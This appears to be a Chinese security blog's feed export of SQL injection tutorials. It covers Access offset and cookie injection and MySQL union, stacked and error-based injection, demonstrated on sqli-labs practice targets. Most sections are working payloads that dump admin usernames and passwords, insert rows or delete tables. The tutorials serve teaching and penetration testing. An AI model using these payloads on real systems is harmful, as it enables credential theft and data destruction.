<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/29085dfd90b5fd67fd8f7629d1c850be.png" alt="29085dfd90b5fd67fd8f7629d1c850be.png"></p>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,s_user,s_pwd,6,7,8,9,10,11 from admin</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/852a57eed1f78e57db355b80fe3504f2.png" alt="852a57eed1f78e57db355b80fe3504f2.png"></p>
<h2 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。</p>
<p>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p>
<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><ul>
<li>假设一个表有8个字段，admin表有3个字段。</li>
<li>联合查询payload：union select 1,2,3,4,5,6,7,8 from admin</li>
<li>在我们不知道admin有多少字段的情况下可以尝试payload：<code>union select 1,2,3,4,5,6,7,admin.* from admin</code>，此时页面出错</li>
<li>直到payload：<code>union select 1,2,3,4,5,admin.* from admin</code>时页面返回正常，说明admin表有三个字段</li>
<li>然后通过移动admin.*的位置，就可以回显不同的数据</li>
</ul>
<h3 id="判断查询列数-1"><a href="#判断查询列数-1" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 38</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/12bb577bfb8ed7fd6e22b1cc1f798ebf.png" alt="12bb577bfb8ed7fd6e22b1cc1f798ebf.png"></p>
<h3 id="判断回显位-1"><a href="#判断回显位-1" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38 from admin</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/dcd9b04d83b81ddf09a3a1bfa647925e.png" alt="dcd9b04d83b81ddf09a3a1bfa647925e.png"></p>
<h3 id="判断表内存在的字段个数"><a href="#判断表内存在的字段个数" class="headerlink" title="判断表内存在的字段个数"></a>判断表内存在的字段个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,* from admin</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/06b7c720180477547b3b2f9462601179.png" alt="06b7c720180477547b3b2f9462601179.png"></p>
<p>发现报错，我们将<code>*</code>位向左移，直到回显正常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8204/show.asp?pkid=4821 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,* from admin</span><br></pre></td></tr></table></figure>

<p><img src="/:/f06a8c98c2fc458f905a8d7c9bf9c5ee" alt="2ee3f68b1695aa7ba65e3ae2a5c67109.png"></p>
<p>发现<code>*</code>在27之后可以正常回显，计算表内查询字段数：38-27=<strong>11</strong></p>
<p>其中还报出了一个数据：admin</p>
<h3 id="偏移注入爆出数据"><a href="#偏移注入爆出数据" class="headerlink" title="偏移注入爆出数据"></a>偏移注入爆出数据</h3><blockquote>
<p>偏移注入公式：</p>
<ul>
<li>查询字段数：* = 11</li>
<li>一级偏移数：38 - 11 = 27</li>
<li>二级偏移数：38 - 11×2 = 16</li>
<li>三级偏移数：38 - 11×3 = 5</li>
</ul>
</blockquote>
<p><strong>二级偏移</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from (admin as a inner join admin as b on a.id=b.id)</span><br></pre></td></tr></table></figure>

<p>发现多爆出一个数据（虽然没什么用）</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/83ce49b0e9d2e2eaeb1a96332cdeac26.png" alt="83ce49b0e9d2e2eaeb1a96332cdeac26.png"></p>
<p><strong>三级偏移</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/21ac4b9cbc6904c04613f41ee3e3664e.png" alt="21ac4b9cbc6904c04613f41ee3e3664e.png"></p>
<h2 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h2><p>同服务器下的站点有注入，知道对方站的数据库绝对路径，知道对方数据库表，表中的字段名可以用这个方法来进行跨库查询。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,admin,3,password,5,6,7,8,9,10,11,12,13,14 from [C:\WebCode\sze7xiaohu.mdb].admin</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/c8ac1fe68934b7a264a31c9fe0061ca8.png" alt="c8ac1fe68934b7a264a31c9fe0061ca8.png"></p>
<h2 id="Cookie手工注入"><a href="#Cookie手工注入" class="headerlink" title="Cookie手工注入"></a>Cookie手工注入</h2><p>cookie注入的原理其实并不复杂。学过ASP语言的应该都知道，在ASP中 例如：</p>
<p><code>id=request.querystring(ID);</code> <code>id=request.form(ID);</code></p>
<p>在正常情况下程序员应该按以上规范进行代码的编写，但是部分程序员，为了方便却将代码写成了如下格式：</p>
<p><code>id=request(ID);</code></p>
<p>虽然此时也加了防注入程序。但是，防注入程序并不支持基于cookie提交的数据。而此时代码由于接受任何提交方式，从而导致了cookie注入的产生！下面我来简单演示下cookie手工注入的过程。</p>
<p>首先，我们在存在cookie注入的页面，按其正常地址进行一次完整的访问。完整访问是为了收集其cookie。</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/00bb0ba54e30d917e0d075f1930909f6.png" alt="00bb0ba54e30d917e0d075f1930909f6.png"></p>
<p>接着，我们使用JS代码在地址栏将原先的地址替换为如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26&quot;));</span><br></pre></td></tr></table></figure>

<p>注：不能直接粘贴，直接粘贴浏览器会自动查询，可以先手动输入javascrip:再粘贴后面的部分。火狐浏览器不支持地址栏JavaScript伪协议，可以在Chrome浏览器中使用。</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/01faa58d37eff6773bc66d514473c264.png" alt="01faa58d37eff6773bc66d514473c264.png"></p>
<p>此时，我们打开一个新页面，将之前存在注入的页面地址拷贝到地址栏。注意：这里将后面的id 参数去除后，再进行访问！如图。页面如果依然返回正常，则说明cookie 修改成功！</p>
<h3 id="构造Cookie注入页面与判断注入点"><a href="#构造Cookie注入页面与判断注入点" class="headerlink" title="构造Cookie注入页面与判断注入点"></a>构造Cookie注入页面与判断注入点</h3><p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/67fb74e1e860392e2ac9597189b985a5.png" alt="67fb74e1e860392e2ac9597189b985a5.png"></p>
<p>and 1=1</p>
<p>刷新后页面正常显示</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061042627.png" alt="37d851bb273e68857fe54f2f04aa5a80.png"></p>
<p>and 1=2</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/f920179cb4bbe8e702f0d83f2e5cd977.png" alt="f920179cb4bbe8e702f0d83f2e5cd977.png"></p>
<p>刷新后页面报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061043124.png" alt="bb70c283af7fd32c357d10c6060c6446.png"></p>
<p>在证明确实存在注入后，我们就可以开始猜它的列数了。</p>
<h3 id="判断查询列数-2"><a href="#判断查询列数-2" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 order by 11&quot;));</span><br></pre></td></tr></table></figure>

<h3 id="判断回显位-2"><a href="#判断回显位-2" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,2,3,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>

<h3 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,username,password,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/ee9bf1be05fbedb60937a69027ca9399.png" alt="ee9bf1be05fbedb60937a69027ca9399.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库注入攻击方式</title>
    <url>/post/c2f49bfa.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="MySQL数据库基本知识"><a href="#MySQL数据库基本知识" class="headerlink" title="MySQL数据库基本知识"></a>MySQL数据库基本知识</h2><h3 id="MySQL数据库介绍"><a href="#MySQL数据库介绍" class="headerlink" title="MySQL数据库介绍"></a>MySQL数据库介绍</h3><p>MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。</p>
<p>MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。由于其社区版的性能卓越，搭配PHP和Apache可组成良好的开发环境。</p>
<p>MySQL服务的默认端口：3306</p>
<h3 id="常见的SQL语句"><a href="#常见的SQL语句" class="headerlink" title="常见的SQL语句"></a>常见的SQL语句</h3><p>创建数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE database_name;</span><br></pre></td></tr></table></figure>

<p>删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE database_name;</span><br></pre></td></tr></table></figure>

<p>查看数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure>

<p>创建数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name(id INT(10),username VARCHAR(20) NOT NULL,password VARCHAR(128),PRIMARY(id));</span><br></pre></td></tr></table></figure>

<p>查看数据表结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC table_name;</span><br></pre></td></tr></table></figure>

<p>插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO table_name(username,password) VALUE(&#x27;admin&#x27;,&#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>

<p>查询数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>更新数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE table_name <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;admin123&#x27;</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>删除数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="MySQL相关函数与常量"><a href="#MySQL相关函数与常量" class="headerlink" title="MySQL相关函数与常量"></a>MySQL相关函数与常量</h3><ul>
<li>system_user() 系统用户名</li>
<li>user() 用户名</li>
<li>current_user() 当前用户名</li>
<li>session_user() 连接数据库的用户名</li>
<li>database() 数据库名</li>
<li>version() mysql数据库版本</li>
<li>load_file() mysql读取本地文件的函数</li>
<li>@@datadir 读取数据库路径</li>
<li>@@basedir mysql安装路径</li>
<li>@@version_compile_os 操作系统版本</li>
</ul>
<h3 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h3><p>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p>
<p><strong>information_schema数据库表说明：</strong></p>
<ul>
<li>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</li>
<li>TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</li>
<li>COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</li>
<li>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</li>
<li>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li>
<li>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</li>
<li>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</li>
<li>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</li>
<li>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</li>
<li>COLLATIONS表：提供了关于各字符集的对照信息。</li>
<li>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</li>
<li>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</li>
<li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li>
<li>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</li>
<li>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</li>
<li>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。</li>
</ul>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合在一起，使用为此为UNINO或UNION ALL。</p>
<p>利用前提条件：页面上有回显位。</p>
<p>什么是回显位？</p>
<p>在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫回显位。</p>
<p><strong>联合注入的过程</strong></p>
<ol>
<li> 判断注入点</li>
<li> 判断闭合类型</li>
<li> 判断查询列数</li>
<li> 判断回显位</li>
<li> 获取数据库名</li>
<li> 获取数据表名</li>
<li> 获取字段名</li>
<li> 获取数据</li>
</ol>
<p>以下使用SQLi-LAB Less-1做演示，使用的数据库为MySQL。</p>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>在参数后面直接添加单引号，显示数据库错误信息或者页面回显不同说明存在注入点</p>
<p><img src="https://i.loli.net/2021/10/05/fjedIBHz96tm7sJ.png" alt="efd00f30ca438d55b6d660f80ad2b67f.png"></p>
<h3 id="判断是闭合类型"><a href="#判断是闭合类型" class="headerlink" title="判断是闭合类型"></a>判断是闭合类型</h3><p><code>http://hackrock.com:811/Less-1/?id=1&#39; and 1=1 --+</code></p>
<p><img src="https://i.loli.net/2021/10/05/AhtWReY9IQpaJEo.png" alt="bf4901f9e301c3f8898a08fdf9689855.png"></p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; and 1=2 --+</code></p>
<p><img src="https://i.loli.net/2021/10/05/O23b6LAp9azcPKv.png" alt="6453ef15aa63127adbe9679021aa521d.png"></p>
<p>使用<code>&#39;and 1=1</code> 显示正常数据，而使用<code>&#39;and 1=2</code>不显示数据，由此可以判断出该注入的闭合类型为单引号闭合</p>
<h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><p>order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次类推。</p>
<p>当排序的列数为3时，发现页面正常显示，说明查询列数≥3</p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; order by 3 --+</code></p>
<p><img src="https://i.loli.net/2021/10/05/CgUasOhqmipowzF.png" alt="548836a22752bc5f1e18bd4f4f170e50.png"></p>
<p>当排序的列数为4时，发现页面报错，说明查询列数&lt;4，由此可以判断出查询列数为3</p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; order by 4 --+</code></p>
<p><img src="https://i.loli.net/2021/10/05/u3Yd7s1NcFVIvBf.png" alt="8ac563257d8084d76e4949c0cc865943.png"></p>
<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><p>UNION的作用是将两个select查询结果合并。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。</p>
<p><code>http://hackrock.com:811/Less-1/?id=-1&#39; union select 1,2,3 --+</code></p>
<p>使union前面的语句报错，执行后面的，爆出显示位，2，3</p>
<p><img src="https://i.loli.net/2021/10/05/tL8R4YCDuq9IQsX.png" alt="bfba3026d7a7dde5a4a5d4dc900e3f67.png"></p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>获取数据库版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,version() --+</span><br></pre></td></tr></table></figure>

<p>获取当前数据库名称：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>

<p>获取所有数据库名称：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>

<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>获取security数据库的所有表名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>

<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><p>获取security数据库的users表中的字段名（列名）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>

<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>获取当前页面查询数据中的username和password字段中的所有值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(&#x27;&lt;br&gt;&#x27;,username,&#x27;~&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>MySQL字符串连接函数：</p>
<ol>
<li>concat()函数 功能：将多个字符串连接成一个字符串。 语法：concat(str1, str2,…) 说明：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</li>
<li>concat_ws()函数 功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符 语法：concat_ws(separator, str1, str2, …) 说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。</li>
<li>group_concat()函数 功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] ) 说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</li>
</ol>
</blockquote>
<h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><p>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
<h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<blockquote>
<p>注：Oracle数据库无法使用堆叠查询。MySQL、PostgreSQL、SQLServer可以使用堆叠查询。</p>
</blockquote>
<h3 id="堆叠注入靶场复现"><a href="#堆叠注入靶场复现" class="headerlink" title="堆叠注入靶场复现"></a>堆叠注入靶场复现</h3><h4 id="sqli-labs-less-39"><a href="#sqli-labs-less-39" class="headerlink" title="sqli-labs less-39"></a>sqli-labs less-39</h4><p><strong>堆叠注入——字符型——GET</strong></p>
<p>源代码：</p>
<p><img src="https://i.loli.net/2021/10/05/OFHGZ31tLE4nmNd.png" alt="2767f275385d1378d9378e245dbd4b62.png"></p>
<p>可以方向查询语句是没有进行过滤的，而且使用PHP的<code>mysqli_multi_query()</code>查询多条语句。</p>
<p>由此构造我们的payload：<code>?id=1;insert into users(id,username,password) values(&#39;38&#39;,&#39;less38&#39;,&#39;hello&#39;) --+</code></p>
<p>执行完成，查看security数据库中的users数据表</p>
<p><img src="https://i.loli.net/2021/10/05/VNG4jXzCx8DwU6O.png" alt="3344e0ed0ac1baeca3f1d4eb2e3fa5d7.png"></p>
<p>成功插入了一条数据。</p>
<h4 id="sqli-labs-less-42"><a href="#sqli-labs-less-42" class="headerlink" title="sqli-labs less-42"></a>sqli-labs less-42</h4><p><strong>报错型堆叠注入——字符型——POST</strong></p>
<p>源代码（login.php）：</p>
<p><img src="https://i.loli.net/2021/10/05/INzeTAucsZJgjQw.png" alt="29efdb0b77231de66c6dd60bdd526ff6.png"></p>
<p>Password 变量在post 过程中，没有通过 <code>mysql_real_escape_string()</code> 函数的处理。因此在登录的时候密码选项我们可以进行 attack。</p>
<blockquote>
<p>mysql_real_escape_string() 函数作用：转义 SQL 语句中使用的字符串中的特殊字符。</p>
</blockquote>
<p>由此构造我们的payload：</p>
<p>username：任意</p>
<p>password：<code>c&#39;;create table like users #</code></p>
<p>security数据库下新增了一个me表</p>
<p><img src="https://i.loli.net/2021/10/05/wfxjHp6odzyMKsv.png" alt="c1bd08116ad7072d558bb9714c46a3cd.png"></p>
<h2 id="基于函数报错的注入"><a href="#基于函数报错的注入" class="headerlink" title="基于函数报错的注入"></a>基于函数报错的注入</h2><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p>这里主要记录一下<strong>xpath语法错误</strong>和<strong>主键重复错误</strong>。</p>
<p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code> 或 <code>updatexml</code> 两个函数。</p>
<p>使用条件：mysql版本&gt;5.1.5</p>
<h3 id="XPath语法错误"><a href="#XPath语法错误" class="headerlink" title="XPath语法错误"></a>XPath语法错误</h3><h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h4><p>正常语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(xml_document,Xpath_string)</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个参数：xml_document是string格式，为xml文档对象的名称</li>
<li>第二个参数：Xpath_string是xpath格式的字符串</li>
<li>作用：从目标xml中返回包含所查询值的字符串</li>
</ul>
<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
<p>payload结构：<code>&#39;and extractvalue(1,concat(0x7e,(select语句),0x7e)) --+</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆字段名：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot;),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(COLUMN_NAME) from TABLE_NAME),0x7e)) --+</span><br></pre></td></tr></table></figure>

<h4 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a>updatexml()函数</h4><p>正常语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(xml_document,xpath_string,new_value)</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个参数：xml_document是string格式，为xml文档对象的名称</li>
<li>第二个参数：xpath_string是xpath格式的字符串</li>
<li>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</li>
</ul>
<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
<p>payload结构：<code>&#39;and updatexml(1,concat(0x7e,(select语句),0x7e),1) --+</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆字段名：&#x27;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot;),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME) from TABLE_NAME),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<h3 id="主键重复错误"><a href="#主键重复错误" class="headerlink" title="主键重复错误"></a>主键重复错误</h3><p><strong>rand()：</strong></p>
<blockquote>
<p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p>
</blockquote>
<p><strong>floor()：</strong></p>
<blockquote>
<p>对任意正或者负的十进制值向下取整</p>
</blockquote>
<p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p>
<p><strong>group by</strong></p>
<blockquote>
<p>group by是根据一个或多个列对结果集进行分组的sql语句</p>
</blockquote>
<p><strong>报错原理：</strong></p>
<ul>
<li>如果<code>count(*)</code>与<code>group by</code>同时出现在SQL语句中，就会产生虚拟表。</li>
<li>向虚拟表中插入数据的操作包含两个动作：检查主键是否存在；如果不存在就插入新的主键，如果存在就将该主键所对应的的<code>count(*)</code>的值加1。</li>
